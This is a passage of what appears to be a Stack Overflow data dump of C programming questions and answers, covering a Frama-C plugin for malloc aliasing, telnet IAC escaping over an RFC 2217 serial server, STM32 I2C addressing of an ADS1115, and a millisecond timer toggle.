{enode = Lval(Var vfunc, _)}, argl, lsome) -&gt;\n      Format.printf \"Call to (%s) and result is the lval #%s# at %a @.\" vfunc.vname call.vname Printer.pp_location lsome;\n      Format.printf \"Function (%s) is called with following params: @.\\n\" vfunc.vname;\n      if argl != [] then\n        List.iter (fun exp -&gt; match exp.enode with\n                     | Lval(Var e, _) when Cil.isPointerType e.vtype -&gt; Format.printf \"pointer #%s#  \" e.vname;\n                     | Lval(Var e, _) when not( Cil.isPointerType e.vtype || Cil.isArrayType e.vtype) -&gt; \n                       Format.printf \"variable #%s#  \" e.vname;\n                     | Lval(Var e, _) when Cil.isArrayType e.vtype -&gt; Format.printf \"static array #%s#  \" e.vname;\n                     | AddrOf(Var v_ad, _) -&gt; Format.printf \"variable #%s#  \" v_ad.vname;\n                     | _ -&gt; ()\n         ) argl;\n      Format.printf \"@.\\n\"; \n      Cil.SkipChildren\n\n    | Call(None, {enode = Lval(Var vfunc, _)}, argl, lnone) -&gt; \n      Format.printf \"Call to (%s) at %a with following params: @.\\n\" vfunc.vname Printer.pp_location lnone; \n      if argl != [] then\n        List.iter (fun exp -&gt; match exp.enode with\n                     | Lval(Var e, _) when Cil.isPointerType e.vtype -&gt; Format.printf \"pointer #%s#  \" e.vname;\n                     | Lval(Var e, _) when not( Cil.isPointerType e.vtype || Cil.isArrayType e.vtype) -&gt; \n                       Format.printf \"variable #%s#  \" e.vname;\n                     | Lval(Var e, _) when Cil.isArrayType e.vtype -&gt; Format.printf \"static array #%s#  \" e.vname;\n                     | AddrOf(Var v_ad, _) -&gt; Format.printf \"variable #%s#  \" v_ad.vname;\n                     | _ -&gt; ()\n        ) argl;\n      Format.printf \"@.\\n\"; \n      Cil.SkipChildren\n\n    | _ -&gt; Cil.DoChildren\n\n   else begin\n     Format.printf \"Not reachable by Db.Value ...@.\";\n     Cil.SkipChildren \n   end \n\n   initializer !Db.Value.compute();\n\nend\n</code></pre>\n\n<p>With this script I can detect some pointers aliasing case. But, for dynamically allocated array with malloc for example, I have some difficulties. </p>\n\n<p>Take for example this little program:</p>\n\n<pre><code>int main(int argc, char** argv) {\n  int n = 20;\n  int *a = malloc(n * sizeof(int)); \n  int *b = malloc(n * sizeof(int));\n  int i;\n  for(i = 0; i&lt;n; i++)\n    *(a + i) = 14 + i;\n  return 0;\n}\n</code></pre>\n\n<p>When I launch inout plugin for example with <code>-deref</code> option, I can see the two value messages:</p>\n\n<blockquote>\n  <p>/home/rokiatou/Documents/frama-c-scripts/test.c:11:[value] allocating variable __malloc_main_l11</p>\n  \n  <p>/home/rokiatou/Documents/frama-c-scripts/test.c:12:[value] allocating variable __malloc_main_l12</p>\n</blockquote>\n\n<p>And these messages of inout plugin:</p>\n\n<blockquote>\n  <p>[inout] Derefs for function main: __malloc_main_l11[0..19]</p>\n</blockquote>\n\n<p>And I read in value plug-in guide, in section 4.6.4:</p>\n\n<blockquote>\n  <p>Dynamic allocation is modeled by creating new bases. Each call to malloc and realloc potentially creates a new base.</p>\n</blockquote>\n\n<p>And in section 8.1.1 that value messages of this form: </p>\n\n<blockquote>\n  <p>[value] allocating variable __malloc_main_l42_2981</p>\n</blockquote>\n\n<p>Indicate that new bases are being created.</p>\n\n<p>So my questions are:</p>\n\n<p>1) How can I access to the base address of variables <code>__malloc*</code> allocated by value and associate it to my real variables present in my source code (for example here the variables <code>a</code> and <code>b</code>)?</p>\n\n<p>2) How can I get the number of elements allocated by a malloc function (here in my example, it is <code>n (=20)</code>)?</p>\n\n<p>I already look at the files cil_types.mli (where I found TPtr and TArray type) and base.mli but I did not really understand their use.</p>\n"}, {"tags": ["c", "sockets", "connection", "telnet"], "answers": [{"comments": [{"owner": {"reputation": 21, "user_id": 9359521, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/854fc3147d4f582e6d603e5d8d6c62a1?s=128&d=identicon&r=PG&f=1", "display_name": "Prols1981", "link": "https://stackoverflow.com/users/9359521/prols1981"}, "edited": false, "score": 0, "creation_date": 1518618745, "post_id": 48787652, "comment_id": 84581026, "body": "Truly the wording is not quite the clearest; it does say that &quot;only the IAC need be doubled to be sent as data&quot;, and I also see (if I connect two ports using a null modem cable and hook a PuTTY session into the second port&#39;s ethernet connection) that I get two unreadable characters (presumably 0x255 and 0x255) when passing IAC twice in a row."}, {"owner": {"reputation": 121127, "user_id": 388520, "user_type": "registered", "accept_rate": 51, "profile_image": "https://www.gravatar.com/avatar/dd7cc06b1b1c347e172c6ba532937173?s=128&d=identicon&r=PG", "display_name": "zwol", "link": "https://stackoverflow.com/users/388520/zwol"}, "reply_to_user": {"reputation": 21, "user_id": 9359521, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/854fc3147d4f582e6d603e5d8d6c62a1?s=128&d=identicon&r=PG&f=1", "display_name": "Prols1981", "link": "https://stackoverflow.com/users/9359521/prols1981"}, "edited": false, "score": 0, "creation_date": 1518625408, "post_id": 48787652, "comment_id": 84585663, "body": "I would be looking into this as a bug in the server-side telnet implementation.  You should find out exactly what those two characters are.  You should also experiment with sending e.g. 255 255 246 (escaped IAC AYT) or 255 255 253 001 (escaped IAC DO ECHO) and see if they are interpreted as commands.  And finally, have a look at <a href=\"https://tools.ietf.org/html/rfc856\" rel=\"nofollow noreferrer\">tools.ietf.org/html/rfc856</a> : putting the telnet channel in &quot;binary mode&quot; may help with this scenario."}, {"owner": {"reputation": 21, "user_id": 9359521, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/854fc3147d4f582e6d603e5d8d6c62a1?s=128&d=identicon&r=PG&f=1", "display_name": "Prols1981", "link": "https://stackoverflow.com/users/9359521/prols1981"}, "edited": false, "score": 0, "creation_date": 1518771243, "post_id": 48787652, "comment_id": 84649542, "body": "I cannot influence the serverside implementation, unfortunately. I have hooked up my own client to the other side and had it print the character codes, and truly, I received 255 255 plainly upon sending those. Testing your escaped examples, everything is passed through unexecuted, as it should be. Checking the requested RFC 856, I saw that binary transmission, code 0, is one of the negotiations handeled. Thus, I swapped my WONT for a WILL, however, it doesn&#39;t seem to have changed anything; IAC is still intrepreted, and two IACs turn out as two IACs."}, {"owner": {"reputation": 288867, "user_id": 207421, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/5cfe5f7d64f44be04f147295f5c7b88e?s=128&d=identicon&r=PG", "display_name": "user207421", "link": "https://stackoverflow.com/users/207421/user207421"}, "edited": false, "score": 0, "creation_date": 1518774415, "post_id": 48787652, "comment_id": 84651332, "body": "I don&#39;t see anything unclear about it. IAC needs to be escaped if present in data. This is not a mystery."}, {"owner": {"reputation": 121127, "user_id": 388520, "user_type": "registered", "accept_rate": 51, "profile_image": "https://www.gravatar.com/avatar/dd7cc06b1b1c347e172c6ba532937173?s=128&d=identicon&r=PG", "display_name": "zwol", "link": "https://stackoverflow.com/users/388520/zwol"}, "reply_to_user": {"reputation": 21, "user_id": 9359521, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/854fc3147d4f582e6d603e5d8d6c62a1?s=128&d=identicon&r=PG&f=1", "display_name": "Prols1981", "link": "https://stackoverflow.com/users/9359521/prols1981"}, "edited": false, "score": 0, "creation_date": 1518782656, "post_id": 48787652, "comment_id": 84656271, "body": "@Prols1981 With the escaped commands, they&#39;re not executed, but do they come through to the far side with the IAC still doubled?"}, {"owner": {"reputation": 21, "user_id": 9359521, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/854fc3147d4f582e6d603e5d8d6c62a1?s=128&d=identicon&r=PG&f=1", "display_name": "Prols1981", "link": "https://stackoverflow.com/users/9359521/prols1981"}, "edited": false, "score": 0, "creation_date": 1519030685, "post_id": 48787652, "comment_id": 84727914, "body": "Well yeah, whatever escaped command there is, if it is preceeded by 255 255, the other side will print 255 255 first and then everything else you entered. I don&#39;t see why succeeding characters would change what had been printed before-hand."}, {"owner": {"reputation": 121127, "user_id": 388520, "user_type": "registered", "accept_rate": 51, "profile_image": "https://www.gravatar.com/avatar/dd7cc06b1b1c347e172c6ba532937173?s=128&d=identicon&r=PG", "display_name": "zwol", "link": "https://stackoverflow.com/users/388520/zwol"}, "edited": false, "score": 0, "creation_date": 1519041262, "post_id": 48787652, "comment_id": 84734296, "body": "The bug -- and I&#39;m convinced it <i>is</i> a bug at this point -- might only have affected <i>incomplete</i> control sequences with a double IAC at the beginning.  (So, like, 255 255 246 would come through as 255 246, but 255 255 020 would keep both 255&#39;s.)"}, {"owner": {"reputation": 21, "user_id": 9359521, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/854fc3147d4f582e6d603e5d8d6c62a1?s=128&d=identicon&r=PG&f=1", "display_name": "Prols1981", "link": "https://stackoverflow.com/users/9359521/prols1981"}, "edited": false, "score": 0, "creation_date": 1519055801, "post_id": 48787652, "comment_id": 84743201, "body": "It might just be a faulty serverside implementation, but as already stated I am completely unable to do anything about that, which is a bummer. Appreciate the help, though!"}], "tags": [], "owner": {"reputation": 121127, "user_id": 388520, "user_type": "registered", "accept_rate": 51, "profile_image": "https://www.gravatar.com/avatar/dd7cc06b1b1c347e172c6ba532937173?s=128&d=identicon&r=PG", "display_name": "zwol", "link": "https://stackoverflow.com/users/388520/zwol"}, "is_accepted": false, "score": 0, "last_activity_date": 1518612514, "creation_date": 1518612514, "answer_id": 48787652, "question_id": 48785374, "link": "https://stackoverflow.com/questions/48785374/ask-a-telnet-server-to-ignore-commands/48787652#48787652", "title": "Ask a Telnet server to ignore commands", "body": "<p>If there's a standard IAC DO IGNORE-FURTHER-IACS, I've never heard of it.</p>\n\n<p><a href=\"https://tools.ietf.org/html/rfc854\" rel=\"nofollow noreferrer\">RFC 854</a> does not explain this very well, but the documented meaning of two IACs in a row is \"data byte 255\", so I think the server is <em>already</em> supposed to pass 0x255 0x255 onward as a single 0x255. Is it not doing that?</p>\n"}], "owner": {"reputation": 21, "user_id": 9359521, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/854fc3147d4f582e6d603e5d8d6c62a1?s=128&d=identicon&r=PG&f=1", "display_name": "Prols1981", "link": "https://stackoverflow.com/users/9359521/prols1981"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 329, "favorite_count": 1, "answer_count": 1, "score": 2, "last_activity_date": 1518771380, "creation_date": 1518605588, "last_edit_date": 1518771380, "question_id": 48785374, "link": "https://stackoverflow.com/questions/48785374/ask-a-telnet-server-to-ignore-commands", "title": "Ask a Telnet server to ignore commands", "body": "<p>Let's say I have a working Telnet server and client; the client is my own C-programmed creation, though the server is not under my control (in my case, it is a Perle Systems IOLAN SCS48, but it could be any RFC2217-enabled Telnet device).</p>\n\n<p>I want to use the devices serial tunneling features (via the RFC 2217 protocol for Telnet), but only at the start of the connection. As such, I receive four negotiation requests from the server (<code>WILL TRANSMIT-BINARY</code>, <code>DO TRANSMIT-BINARY</code>, <code>WILL ECHO</code>, <code>DO SUPPRESS-GO-AHEAD</code>, <code>WILL SUPPRESS-GO-AHEAD</code> and <code>DO COM-PORT-OPTION</code>; the last one being from RFC 2217), to all of which I respond, and then set baudrate, datasize, parity bit and stop bit.</p>\n\n<p>So far so good, but now I want to re-arrange the communication so the server ignores all future commands (especiall the <code>IAC</code> character <code>0x255</code>), so I can pass Hex-converted strings through the device to the receiving end (connected to the device's serial port), which gets every single byte I send (and not lose three bytes for every 0x255 that is somewhere in my string, or seven bytes where there is <code>0x255 0x250</code> (<code>IAC SB</code>)).</p>\n\n<p>Alternatively, would there be a possibility to make the server pass an escaped escape char (two 0x255's in a row, which are then printed as-input) as a single 0x255?</p>\n\n<p>I do not want to close the connection to reopen it is a raw one, as my serial settings would be lost (because that's how the device's COM port redirection works, I suppose). However, I do not need to re-establish command listening, so the connection can simply be closed and reopened as another Telnet connection if I need to reconfigure the baudrate.</p>\n\n<p>How would I approach this?</p>\n"}, {"tags": ["c", "stm32", "i2c"], "comments": [{"owner": {"reputation": 3123, "user_id": 2097041, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/8L21m.jpg?s=128&g=1", "display_name": "Colin", "link": "https://stackoverflow.com/users/2097041/colin"}, "edited": false, "score": 0, "creation_date": 1518606545, "post_id": 48785157, "comment_id": 84572714, "body": "Is that all your code? You&#39;re falling out of your <code>main</code> function if so."}, {"owner": {"reputation": 11, "user_id": 9343031, "user_type": "registered", "profile_image": "https://graph.facebook.com/1528770003900095/picture?type=large", "display_name": "Mohammad Affash", "link": "https://stackoverflow.com/users/9343031/mohammad-affash"}, "reply_to_user": {"reputation": 3123, "user_id": 2097041, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/8L21m.jpg?s=128&g=1", "display_name": "Colin", "link": "https://stackoverflow.com/users/2097041/colin"}, "edited": false, "score": 0, "creation_date": 1518608293, "post_id": 48785157, "comment_id": 84573837, "body": "sorry but when i wrote the question something wrong happend but now this is the code .."}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1518611830, "post_id": 48785157, "comment_id": 84576303, "body": "What he&#39;s saying is that <code>int main (void)</code> makes no sense in bare metal microcontroller applications."}, {"owner": {"reputation": 11, "user_id": 9343031, "user_type": "registered", "profile_image": "https://graph.facebook.com/1528770003900095/picture?type=large", "display_name": "Mohammad Affash", "link": "https://stackoverflow.com/users/9343031/mohammad-affash"}, "edited": false, "score": 0, "creation_date": 1518613211, "post_id": 48785157, "comment_id": 84577259, "body": "i have read many example codes and  int main(void) is always used i didnt get the point can you explain more plz??"}, {"owner": {"reputation": 11, "user_id": 9343031, "user_type": "registered", "profile_image": "https://graph.facebook.com/1528770003900095/picture?type=large", "display_name": "Mohammad Affash", "link": "https://stackoverflow.com/users/9343031/mohammad-affash"}, "edited": false, "score": 0, "creation_date": 1518613409, "post_id": 48785157, "comment_id": 84577384, "body": "im kind of beginner guys so any tip would be appreciated ..."}, {"owner": {"reputation": 33488, "user_id": 6110094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/wozpD.png?s=128&g=1", "display_name": "0___________", "link": "https://stackoverflow.com/users/6110094/0"}, "edited": false, "score": 0, "creation_date": 1518616960, "post_id": 48785157, "comment_id": 84579744, "body": "It makes sence of the exit routine makes any use of the returned value. @Ludlin not every startup/exit code in the bare metal programming is as simple as the standard cube .ones"}, {"owner": {"reputation": 3123, "user_id": 2097041, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/8L21m.jpg?s=128&g=1", "display_name": "Colin", "link": "https://stackoverflow.com/users/2097041/colin"}, "edited": false, "score": 0, "creation_date": 1518620593, "post_id": 48785157, "comment_id": 84582380, "body": "What is your microcontroller doing when you return from <code>main</code>?"}, {"owner": {"reputation": 980, "user_id": 1601273, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/9d5b52380a6b98019af42de8e621448d?s=128&d=identicon&r=PG", "display_name": "Bulkin", "link": "https://stackoverflow.com/users/1601273/bulkin"}, "edited": false, "score": 0, "creation_date": 1518687347, "post_id": 48785157, "comment_id": 84610472, "body": "STM32 Standard Peripheral Libraries are not supported any more. Better use HAL Libs. And how do you chek ACK status?"}, {"owner": {"reputation": 11, "user_id": 9343031, "user_type": "registered", "profile_image": "https://graph.facebook.com/1528770003900095/picture?type=large", "display_name": "Mohammad Affash", "link": "https://stackoverflow.com/users/9343031/mohammad-affash"}, "edited": false, "score": 0, "creation_date": 1518693344, "post_id": 48785157, "comment_id": 84614492, "body": "the AF flag is &quot;1&quot; and that means no ack from the slave is it right ??"}, {"owner": {"reputation": 11, "user_id": 9343031, "user_type": "registered", "profile_image": "https://graph.facebook.com/1528770003900095/picture?type=large", "display_name": "Mohammad Affash", "link": "https://stackoverflow.com/users/9343031/mohammad-affash"}, "edited": false, "score": 0, "creation_date": 1518693540, "post_id": 48785157, "comment_id": 84614602, "body": "i have noticed that when i run the program in debug mode i have this problem (AF=1) ,but when i run it  continually i get results from the ads1115 but the result is always 0xffff ..."}, {"owner": {"reputation": 980, "user_id": 1601273, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/9d5b52380a6b98019af42de8e621448d?s=128&d=identicon&r=PG", "display_name": "Bulkin", "link": "https://stackoverflow.com/users/1601273/bulkin"}, "edited": false, "score": 0, "creation_date": 1518704582, "post_id": 48785157, "comment_id": 84622159, "body": "This code is too ugly. Show the rest. How do you get the data? You can do this much more easier with HAL lib."}, {"owner": {"reputation": 11, "user_id": 9343031, "user_type": "registered", "profile_image": "https://graph.facebook.com/1528770003900095/picture?type=large", "display_name": "Mohammad Affash", "link": "https://stackoverflow.com/users/9343031/mohammad-affash"}, "edited": false, "score": 0, "creation_date": 1518705754, "post_id": 48785157, "comment_id": 84622943, "body": "ok .. can anyone pls give a link to the HAL library files and where can i find a description to it ???"}, {"owner": {"reputation": 980, "user_id": 1601273, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/9d5b52380a6b98019af42de8e621448d?s=128&d=identicon&r=PG", "display_name": "Bulkin", "link": "https://stackoverflow.com/users/1601273/bulkin"}, "edited": false, "score": 0, "creation_date": 1518706740, "post_id": 48785157, "comment_id": 84623672, "body": "@MohammadAffash Start from <a href=\"http://www.st.com/en/development-tools/stm32cubemx.html\" rel=\"nofollow noreferrer\">here</a>"}, {"owner": {"reputation": 11, "user_id": 9343031, "user_type": "registered", "profile_image": "https://graph.facebook.com/1528770003900095/picture?type=large", "display_name": "Mohammad Affash", "link": "https://stackoverflow.com/users/9343031/mohammad-affash"}, "reply_to_user": {"reputation": 980, "user_id": 1601273, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/9d5b52380a6b98019af42de8e621448d?s=128&d=identicon&r=PG", "display_name": "Bulkin", "link": "https://stackoverflow.com/users/1601273/bulkin"}, "edited": false, "score": 0, "creation_date": 1518707399, "post_id": 48785157, "comment_id": 84624117, "body": "Thanx alot @Bulkin"}], "answers": [{"tags": [], "owner": {"reputation": 1, "user_id": 11297048, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/aa7m5.jpg?s=128&g=1", "display_name": "Mevlut OZTURK", "link": "https://stackoverflow.com/users/11297048/mevlut-ozturk"}, "is_accepted": false, "score": -1, "last_activity_date": 1554184693, "creation_date": 1554184693, "answer_id": 55467850, "question_id": 48785157, "link": "https://stackoverflow.com/questions/48785157/stm32f10x-ads1115-i2c-af-flag-is-always-set/55467850#55467850", "title": "STM32f10x -- ADS1115 -- I2C -- AF flag is always set", "body": "<p>ads1115 just have 4 adress\n0x48 0x49 0x4A 0x4B</p>\n\n<p>You can find addressing on datasheet</p>\n\n<p>you can not use 0x90 adress for ads1115</p>\n"}], "owner": {"reputation": 11, "user_id": 9343031, "user_type": "registered", "profile_image": "https://graph.facebook.com/1528770003900095/picture?type=large", "display_name": "Mohammad Affash", "link": "https://stackoverflow.com/users/9343031/mohammad-affash"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 429, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1554184693, "creation_date": 1518604948, "last_edit_date": 1518687690, "question_id": 48785157, "link": "https://stackoverflow.com/questions/48785157/stm32f10x-ads1115-i2c-af-flag-is-always-set", "title": "STM32f10x -- ADS1115 -- I2C -- AF flag is always set", "body": "<p>I have a problem to get an ACK from the ADS1115 when I send it address.\nI use Embitz IDE and STM32 Standard Peripheral Libraries.</p>\n\n<p>I always get the AF = 1.</p>\n\n<p>This is the code:</p>\n\n<pre class=\"lang-c prettyprint-override\"><code>#include \"stm32f10x_conf.h\"\n\n#define ADS1115_Address  0x90\n\nint main(void) {\n    GPIO_InitTypeDef GPIO_InitStructure;\n    I2C_InitTypeDef I2C_InitStructure;\n    RCC_APB1PeriphClockCmd(RCC_APB1Periph_I2C1, ENABLE);\n    RCC_APB2PeriphClockCmd(RCC_APB2Periph_GPIOB, ENABLE);\n\n    GPIO_InitStructure.GPIO_Pin = GPIO_Pin_6 | GPIO_Pin_7;\n    GPIO_InitStructure.GPIO_Mode = GPIO_Mode_AF_OD;\n    GPIO_InitStructure.GPIO_Speed = GPIO_Speed_50MHz;\n    GPIO_Init(GPIOB, &amp;GPIO_InitStructure);\n    GPIO_PinRemapConfig(GPIO_Remap_I2C1, ENABLE);\n\n    I2C_DeInit(I2C1);\n\n    I2C_InitStructure.I2C_Ack = I2C_Ack_Enable;\n    I2C_InitStructure.I2C_AcknowledgedAddress = I2C_AcknowledgedAddress_7bit;\n    I2C_InitStructure.I2C_ClockSpeed = 100000;\n    I2C_InitStructure.I2C_DutyCycle = I2C_DutyCycle_2;\n    I2C_InitStructure.I2C_Mode = I2C_Mode_I2C;\n    I2C_InitStructure.I2C_OwnAddress1 = 0;\n    I2C_Init(I2C1, &amp;I2C_InitStructure);\n    I2C_Cmd(I2C1, ENABLE);\n\n    while(1) {\n        I2C_GenerateSTART(I2C1, ENABLE);\n        I2C_Send7bitAddress(I2C1, ADS1115_Address, I2C_Direction_Transmitter);\n    }\n}\n</code></pre>\n"}, {"tags": ["c", "embedded", "microcontroller", "interrupt"], "comments": [{"owner": {"reputation": 1727, "user_id": 5440453, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3500f6dc5327b259bb48da3399268b0?s=128&d=identicon&r=PG&f=1", "display_name": "Algirdas Preid\u017eius", "link": "https://stackoverflow.com/users/5440453/algirdas-preid%c5%beius"}, "edited": false, "score": 0, "creation_date": 1518604966, "post_id": 48785067, "comment_id": 84571672, "body": "If the <code>elapsed == activeTime</code>, and <code>else</code> branch triggers, once your <code>elapsed--</code> runs, the condition of <code>elapsed &lt; activeTime</code> is, once again, true. Why don&#39;t just reset <code>elapsed</code> to <code>0</code>, and invert <code>shouldActivate</code>, once the value of <code>elapsed</code> reaches <code>activeTime</code>?"}, {"owner": {"reputation": 541, "user_id": 7559896, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/45ec66f72c97e2759cb0afa754b52432?s=128&d=identicon&r=PG&f=1", "display_name": "DEKKER", "link": "https://stackoverflow.com/users/7559896/dekker"}, "reply_to_user": {"reputation": 1727, "user_id": 5440453, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3500f6dc5327b259bb48da3399268b0?s=128&d=identicon&r=PG&f=1", "display_name": "Algirdas Preid\u017eius", "link": "https://stackoverflow.com/users/5440453/algirdas-preid%c5%beius"}, "edited": false, "score": 0, "creation_date": 1518605238, "post_id": 48785067, "comment_id": 84571866, "body": "@AlgirdasPreid\u017eius Thanks, I think what you say is right but works only if target time is 500...but what if my active time is 700 or 300?"}, {"owner": {"reputation": 1727, "user_id": 5440453, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3500f6dc5327b259bb48da3399268b0?s=128&d=identicon&r=PG&f=1", "display_name": "Algirdas Preid\u017eius", "link": "https://stackoverflow.com/users/5440453/algirdas-preid%c5%beius"}, "edited": false, "score": 0, "creation_date": 1518605367, "post_id": 48785067, "comment_id": 84571951, "body": "Where did I mention, any specific number (apart from <code>0</code>), in my comment? Why do you think, that it won&#39;t work with any other number?"}, {"owner": {"reputation": 4888, "user_id": 5785362, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2a786fd81952576dc07942023bf8830b?s=128&d=identicon&r=PG", "display_name": "tofro", "link": "https://stackoverflow.com/users/5785362/tofro"}, "edited": false, "score": 0, "creation_date": 1518607814, "post_id": 48785067, "comment_id": 84573526, "body": "The affected variables should be declared <code>volatile</code> to prevent the optimizer from holding them in registers only (I guess you have code outside <code>tick()</code> that accesses them)"}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1518609324, "post_id": 48785067, "comment_id": 84574565, "body": "These kind of questions are getting tiresome. Where is your re-entrancy protection mechanism? What code is executed in the ISR? <a href=\"https://stackoverflow.com/a/48517862/584518\">stackoverflow.com/a/48517862/584518</a>"}], "answers": [{"tags": [], "owner": {"reputation": 282, "user_id": 9015013, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6f3d083e8707051e81ed4e7a3830a418?s=128&d=identicon&r=PG&f=1", "display_name": "Karol T.", "link": "https://stackoverflow.com/users/9015013/karol-t"}, "is_accepted": true, "score": 2, "last_activity_date": 1518605050, "creation_date": 1518605050, "answer_id": 48785187, "question_id": 48785067, "link": "https://stackoverflow.com/questions/48785067/condition-for-cycling-between-a-value-each-x-milliseconds-within-a-full-second/48785187#48785187", "title": "Condition for cycling between a value each X milliseconds within a full second", "body": "<p>You have two solutions, make new variable \"direction\" (for specify if you are decrementing or incrementing) but I think better is something like:</p>\n\n<pre><code>void tick() {\n  elapsed++;\n  if(elapsed &lt; activeTime) {\n     shouldActivate = 1;\n  } else {\n     shouldActivate = 0;\n  }\n  if(elapsed&gt;999)\n    elapsed = 0;\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 1727, "user_id": 5440453, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3500f6dc5327b259bb48da3399268b0?s=128&d=identicon&r=PG&f=1", "display_name": "Algirdas Preid\u017eius", "link": "https://stackoverflow.com/users/5440453/algirdas-preid%c5%beius"}, "is_accepted": false, "score": 0, "last_activity_date": 1518605567, "creation_date": 1518605567, "answer_id": 48785368, "question_id": 48785067, "link": "https://stackoverflow.com/questions/48785067/condition-for-cycling-between-a-value-each-x-milliseconds-within-a-full-second/48785368#48785368", "title": "Condition for cycling between a value each X milliseconds within a full second", "body": "<p>The reason for why your code isn't working is: If the <code>elapsed == activeTime</code>, and <code>else</code> branch triggers, your <code>elapsed--</code> runs, and after which, the condition of <code>elapsed &lt; activeTime</code> is, once again, true, hence why it keeps going back-and-forth between branches.</p>\n\n<p>Simplest solution, in my opinion, is just resetting elapsed to <code>0</code>, and inverting <code>shouldActivate</code>, once the value of <code>elapsed</code> reaches <code>activeTime</code>.</p>\n\n<pre><code>void tick() {\n  if(elapsed &lt; activeTime) {\n     elapsed++;\n  } else {\n     elapsed = 0;\n     shouldActivate = !shouldActivate;\n  }\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 5000, "user_id": 8405835, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/sN3eq.png?s=128&g=1", "display_name": "Abhijit Pritam Dutta", "link": "https://stackoverflow.com/users/8405835/abhijit-pritam-dutta"}, "is_accepted": false, "score": 1, "last_activity_date": 1518606664, "creation_date": 1518606664, "answer_id": 48785767, "question_id": 48785067, "link": "https://stackoverflow.com/questions/48785067/condition-for-cycling-between-a-value-each-x-milliseconds-within-a-full-second/48785767#48785767", "title": "Condition for cycling between a value each X milliseconds within a full second", "body": "<p>As per my understanding your application should active for 500 ms and sleep or inactive for 500ms. You can achieve that like below:-</p>\n\n<pre><code>int activeTime = 500; // 500ms active\nint shouldActivate = 0;\nint elapsed = 0; //how many ticks we had so far\n// This function gets automatically called every 1ms\nvoid tick() {\n   if(elapsed &lt; activeTime) {\n   elapsed++;\n   shouldActivate = 1;\n  } else {\n     shouldActivate = 0;\n     elapsed++;//keep increasing elapsed for another 500ms\n  }\n    // after sleeping for 500ms assign elapsed to zero so that it should active again\n    if(elapsed &gt;= (activeTime + 500))       \n      elapsed = 0\n    //with the above condition you can switch off and on every after 500ms \n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 171938, "user_id": 2684539, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2c5fff6fb65e95570ad1a90fe1e3522e?s=128&d=identicon&r=PG&f=1", "display_name": "Jarod42", "link": "https://stackoverflow.com/users/2684539/jarod42"}, "is_accepted": false, "score": 1, "last_activity_date": 1518608540, "creation_date": 1518608540, "answer_id": 48786382, "question_id": 48785067, "link": "https://stackoverflow.com/questions/48785067/condition-for-cycling-between-a-value-each-x-milliseconds-within-a-full-second/48786382#48786382", "title": "Condition for cycling between a value each X milliseconds within a full second", "body": "<p>How about:</p>\n\n<pre><code>const int activeTime = 500; // 500ms active\nint shouldActivate = 0;\nint elapsed = 0; //how many ticks we had so far\n\n// This function gets automatically called every 1ms\nvoid tick() {\n    elapsed = (elapsed + 1) % 1000;\n    shouldActivate = (elapsed &lt; activeTime);\n\n    // And possibly:\n    // if (elapsed == activeTime) { /* State change to Inactivate */}\n    // if (elapsed == 0) { /* State change to activate */}\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 80047, "user_id": 169346, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/645dbb4f7ba1ff9d7ff2de02f68fbe9c?s=128&d=identicon&r=PG", "display_name": "JeremyP", "link": "https://stackoverflow.com/users/169346/jeremyp"}, "is_accepted": false, "score": 1, "last_activity_date": 1518609410, "creation_date": 1518609410, "answer_id": 48786658, "question_id": 48785067, "link": "https://stackoverflow.com/questions/48785067/condition-for-cycling-between-a-value-each-x-milliseconds-within-a-full-second/48786658#48786658", "title": "Condition for cycling between a value each X milliseconds within a full second", "body": "<p>So your code only decrements <code>elapsed</code> once then the next time through, <code>elapsed</code> &lt; <code>active</code>, so it increments again.</p>\n\n<p>Most answers so far reset <code>elapsed</code> when it gets to 500 or 1,000. However, if it is called <code>elapsed</code> I think it should contain the elapsed time since the start. Here's a solution that allows <code>elapsed</code> to go on increasing forever, or at least for just over 2 billion milliseconds for a 32 bit int.</p>\n\n<pre><code>void tick()\n{\n     shouldActivate = elapsed % (2 * activeTime) &lt; activeTime;\n     